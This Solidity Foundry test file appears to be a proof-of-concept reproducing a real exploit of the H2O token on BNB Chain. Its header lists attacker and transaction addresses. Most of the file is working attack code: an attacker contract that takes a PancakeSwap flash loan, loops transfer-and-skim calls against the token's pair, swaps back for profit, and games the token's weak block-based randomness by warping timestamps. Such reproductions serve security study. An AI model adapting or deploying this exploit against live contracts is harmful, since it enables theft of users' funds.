// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 22470 USD
// Attacker : https://bscscan.com/address/0x8842dd26fd301c74afc4df12e9cdabd9db107d1e
// Attack Contract : https://bscscan.com/address/0x03ca8b574dd4250576f7bccc5707e6214e8c6e0d
// Vulnerable Contract : https://bscscan.com/address/0xe9c4d4f095c7943a9ef5ec01afd1385d011855a1
// Attack Tx 1(Loss profit) : https://bscscan.com/tx/0x729c502a7dfd5332a9bdbcacec97137899ecc82c17d0797b9686a7f9f6005cb7
// Attack Tx 2(revert) : https://bscscan.com/tx/0x3b0891a4eb65d916bb0069c69a51d9ff165bf69f83358e37523d0c275f2739bd
// Attack Tx 3(revert) : https://bscscan.com/tx/0xd97694e02eb94f48887308a945a7e58b62bd6f20b28aaaf2978090e5535f3a8e
// Attack Tx 4(profit) : https://bscscan.com/tx/0x994abe7906a4a955c103071221e5eaa734a30dccdcdaac63496ece2b698a0fc3
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant H2O = 0xe9c4D4f095C7943a9ef5EC01AfD1385D011855A1;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;

address constant pancakeSwapFactoryV2 = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
address constant PancakeV3Pool = 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb;
address constant pancakeSwapRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract H2O_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 47_454_899 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attC = new AttackerC();

        // Fund the contract
        deal(BUSD, address(attC), 300 ether);

        // 1st attack(No profit): https://bscscan.com/tx/0x729c502a7dfd5332a9bdbcacec97137899ecc82c17d0797b9686a7f9f6005cb7
        _setRandomIn(0);
        attC.attack();
        console2.log("Profit:", int256(IFS(BUSD).balanceOf(address(attC))) - 300 ether);

        // 2nd attack(revert), fail random check: https://bscscan.com/tx/0x3b0891a4eb65d916bb0069c69a51d9ff165bf69f83358e37523d0c275f2739bd
        
        // 3rd attack(revert), fail random check: https://bscscan.com/tx/0xd97694e02eb94f48887308a945a7e58b62bd6f20b28aaaf2978090e5535f3a8e
        
        // 4th attack: https://bscscan.com/tx/0x994abe7906a4a955c103071221e5eaa734a30dccdcdaac63496ece2b698a0fc3
        
        _setRandomIn(1);
        attC.attack();
        console2.log("Profit:", int256(IFS(BUSD).balanceOf(address(attC))) - 300 ether);
    }

    function _setRandomIn(uint256 n) internal {
        while(true) {
            bytes32 randomBytes = keccak256(abi.encodePacked(
                block.timestamp, 
                IFS(H2O).pair(),
                blockhash(block.number-1))
            );
            uint256 r = uint256(randomBytes) % 2;
            if (r == n) break;
            vm.warp(block.timestamp + 1);
        }
    }
}

contract AttackerC {
    address pair;

    function attack() external {
        pair = IFS(pancakeSwapFactoryV2).getPair(H2O, BUSD);
        
        IFS(PancakeV3Pool).flash(
            address(this), 
            100000 ether,
            0,
            ""
        );

    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        uint256 bal0 = IFS(BUSD).balanceOf(address(this));
        IFS(BUSD).approve(pancakeSwapRouterV2, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = BUSD;
        path[1] = H2O;
        IFS(pancakeSwapRouterV2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bal0,
            0,
            path,
            address(this),
            block.timestamp
        );

        for (uint256 i = 0; i < 50; i++) {
            uint256 bal = IFS(H2O).balanceOf(address(this));
            IFS(H2O).transfer(pair, bal);
            IFS(pair).skim(address(this));
        }

        uint256 bal1 = IFS(H2O).balanceOf(address(this));
        console2.log(bal1);

        IFS(H2O).approve(pancakeSwapRouterV2, type(uint256).max);

        address[] memory path2 = new address[](2);
        path2[0] = H2O;
        path2[1] = BUSD;
        IFS(pancakeSwapRouterV2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bal1,
            0,
            path2,
            address(this),
            block.timestamp
        );

        IFS(BUSD).transfer(PancakeV3Pool, 100000 ether + fee0);
    }
}

interface IFS is IERC20 {
    // PancakeSwap: Pair
    function skim(address to) external;

    // PancakeSwap: Factory v2
    function getPair(address tokenA, address tokenB) external view returns (address pair);

    // PancakeV3Pool
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external;

    // IPancakeRouter02
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    // H2O
    function pair() external view returns(address);
}

